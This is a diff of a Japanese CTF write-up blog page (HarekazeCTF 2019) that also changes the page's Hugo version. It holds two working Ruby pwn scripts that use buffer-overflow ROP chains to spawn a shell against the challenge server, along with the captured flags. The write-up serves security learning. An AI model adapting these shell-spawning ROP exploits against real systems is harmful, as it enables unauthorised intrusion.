@@ -16,7 +16,7 @@
   $ make life - HarekazeCTF 2019 writeup 
 </title>
 
-<meta name="generator" content="Hugo 0.53" />
+<meta name="generator" content="Hugo 0.72.0" />
 
 
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/default.min.css">
@@ -68,95 +68,80 @@
 <section id="content-pane" class="row">
   <div class="col-md-12 text-justify content">
     
-    
-
-<h2 id="baby-rop-1">Baby ROP 1</h2>
-
+    <h2 id="baby-rop-1">Baby ROP 1</h2>
 <ul>
 <li>バイナリ中で、<code>system</code> 関数使ってechoしており、Canary等もないBOFが起こるので、<code>pop rdi; ret</code> 使って<code>system(/bin/sh)</code> を呼ぶだけ</li>
 </ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#75715e">#!/usr/bin/env ruby</span>
 
-<pre><code class="language-ruby">#!/usr/bin/env ruby
+require <span style="color:#e6db74">&#39;pwn&#39;</span>
 
-require 'pwn'
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">:debug</span>
+z <span style="color:#f92672">=</span> <span style="color:#66d9ef">Sock</span><span style="color:#f92672">.</span>new <span style="color:#e6db74">&#34;problem.harekaze.com&#34;</span>, <span style="color:#ae81ff">20001</span>
 
-context.log_level = :debug
-z = Sock.new &quot;problem.harekaze.com&quot;, 20001
+pop_rdi_ret <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400683</span>)
+system <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x4005e3</span>)
 
-pop_rdi_ret = p64(0x00400683)
-system = p64(0x4005e3)
+<span style="color:#66d9ef">STDIN</span><span style="color:#f92672">.</span>gets
+z<span style="color:#f92672">.</span>recvuntil <span style="color:#e6db74">&#34;? &#34;</span>
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">24</span>
+payload <span style="color:#f92672">&lt;&lt;</span> pop_rdi_ret
+payload <span style="color:#f92672">&lt;&lt;</span> p64(<span style="color:#ae81ff">0x601048</span>)
+payload <span style="color:#f92672">&lt;&lt;</span> system
 
-STDIN.gets
-z.recvuntil &quot;? &quot;
-payload = &quot;A&quot; * 24
-payload &lt;&lt; pop_rdi_ret
-payload &lt;&lt; p64(0x601048)
-payload &lt;&lt; system
+z<span style="color:#f92672">.</span>sendline payload
 
-z.sendline payload
-
-z.interact
-</code></pre>
-
-<ul>
+z<span style="color:#f92672">.</span>interact
+</code></pre></div><ul>
 <li><strong>HarekazeCTF{r3turn_0r13nt3d_pr0gr4mm1ng_i5_3ss3nt141_70_pwn}</strong></li>
 </ul>
-
 <h2 id="baby-rop-2">Baby ROP 2</h2>
-
 <ul>
 <li><code>system</code> 関数などは、存在しないが、libc が配布されているので、ROPでlibcアドレスリークして、One-Gagdet に飛ばすだけ</li>
 </ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#75715e">#!/usr/bin/env ruby</span>
 
-<pre><code class="language-ruby">#!/usr/bin/env ruby
+require <span style="color:#e6db74">&#39;pwn&#39;</span>
 
-require 'pwn'
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">:debug</span>
+z <span style="color:#f92672">=</span> <span style="color:#66d9ef">Sock</span><span style="color:#f92672">.</span>new <span style="color:#e6db74">&#34;problem.harekaze.com&#34;</span>, <span style="color:#ae81ff">20005</span>
+<span style="color:#75715e">#z = Sock.new &#34;localhost&#34;, 9999</span>
+elf <span style="color:#f92672">=</span> <span style="color:#66d9ef">ELF</span><span style="color:#f92672">.</span>new <span style="color:#e6db74">&#34;./babyrop2&#34;</span>
+libc <span style="color:#f92672">=</span> <span style="color:#66d9ef">ELF</span><span style="color:#f92672">.</span>new <span style="color:#e6db74">&#34;./libc.so.6&#34;</span>
+<span style="color:#75715e">#libc = ELF.new &#34;./mylibc.so.6&#34;</span>
 
-context.log_level = :debug
-z = Sock.new &quot;problem.harekaze.com&quot;, 20005
-#z = Sock.new &quot;localhost&quot;, 9999
-elf = ELF.new &quot;./babyrop2&quot;
-libc = ELF.new &quot;./libc.so.6&quot;
-#libc = ELF.new &quot;./mylibc.so.6&quot;
+pop_rdi_ret <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400733</span>)
+z<span style="color:#f92672">.</span>recvuntil <span style="color:#e6db74">&#34;? &#34;</span>
 
-pop_rdi_ret = p64(0x00400733)
-z.recvuntil &quot;? &quot;
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">40</span>
+payload <span style="color:#f92672">&lt;&lt;</span> pop_rdi_ret
+payload <span style="color:#f92672">&lt;&lt;</span> p64(elf<span style="color:#f92672">.</span>got<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;__libc_start_main&#34;</span><span style="color:#f92672">]</span>)
+payload <span style="color:#f92672">&lt;&lt;</span> p64(<span style="color:#ae81ff">0x4004f0</span>)
+payload <span style="color:#f92672">&lt;&lt;</span> p64(elf<span style="color:#f92672">.</span>symbols<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;main&#34;</span><span style="color:#f92672">]</span>)
+<span style="color:#66d9ef">STDIN</span><span style="color:#f92672">.</span>gets
+z<span style="color:#f92672">.</span>sendline payload
 
-payload = &quot;A&quot; * 40
-payload &lt;&lt; pop_rdi_ret
-payload &lt;&lt; p64(elf.got[&quot;__libc_start_main&quot;])
-payload &lt;&lt; p64(0x4004f0)
-payload &lt;&lt; p64(elf.symbols[&quot;main&quot;])
-STDIN.gets
-z.sendline payload
-
-recvlen = &quot;Welcome to the Pwn World again, AAAAAAAAAAAAAAAAAAAAAAAAAAAAA!\n&quot;.length
-data = z.recvuntil &quot;? &quot;
+recvlen <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Welcome to the Pwn World again, AAAAAAAAAAAAAAAAAAAAAAAAAAAAA!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>length
+data <span style="color:#f92672">=</span> z<span style="color:#f92672">.</span>recvuntil <span style="color:#e6db74">&#34;? &#34;</span>
 p data
-libc_base = u64(data[recvlen, 6].ljust(8, &quot;\x00&quot;)) - libc.symbols[&quot;__libc_start_main&quot;]
-libc_magic = libc_base + 0xf02a4
-puts &quot;libc base 0x%x&quot; % libc_base
-puts &quot;libc magic 0x%x&quot; % libc_magic
+libc_base <span style="color:#f92672">=</span> u64(data<span style="color:#f92672">[</span>recvlen, <span style="color:#ae81ff">6</span><span style="color:#f92672">].</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;__libc_start_main&#34;</span><span style="color:#f92672">]</span>
+libc_magic <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xf02a4</span>
+puts <span style="color:#e6db74">&#34;libc base 0x%x&#34;</span> <span style="color:#f92672">%</span> libc_base
+puts <span style="color:#e6db74">&#34;libc magic 0x%x&#34;</span> <span style="color:#f92672">%</span> libc_magic
 
-payload = &quot;B&quot; * 40
-payload &lt;&lt; p64(libc_magic)
-z.sendline payload
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">40</span>
+payload <span style="color:#f92672">&lt;&lt;</span> p64(libc_magic)
+z<span style="color:#f92672">.</span>sendline payload
 
-z.interact
-</code></pre>
-
-<ul>
+z<span style="color:#f92672">.</span>interact
+</code></pre></div><ul>
 <li><strong>HarekazeCTF{u53_b55_53gm3nt_t0_pu7_50m37h1ng}</strong></li>
 </ul>
-
 <h2 id="login">Login</h2>
-
 <ul>
 <li>解けなかった、脆弱性わからず</li>
 </ul>
-
 <h2 id="harekaze-note">Harekaze Note</h2>
-
 <ul>
 <li>Note の削除時に何も考慮してないため、Heapアドレスのリークやdouble freeができるが、そこから攻撃に繋げられず</li>
 </ul>
@@ -221,7 +206,7 @@ z.interact
   
   <h6 class="text-center copyright">© 2019. Chihiro Hasegawa. <a href="https://creativecommons.org/licenses/by/3.0/">Some Rights Reserved</a>.</h6>
   
-  <h6 class="text-center powered">Powered by <a href="https://gohugo.io/">Hugo  v0.53</a> &amp; <a href="https://github.com/shenoybr/hugo-goa">Goa</a>.</h6>
+  <h6 class="text-center powered">Powered by <a href="https://gohugo.io/">Hugo  v0.72.0</a> &amp; <a href="https://github.com/shenoybr/hugo-goa">Goa</a>.</h6>
   
       
       <h6><a href="" aria-label="RSS Feed"><i class="fas fa-rss" aria-hidden="true"></i></a></h6>
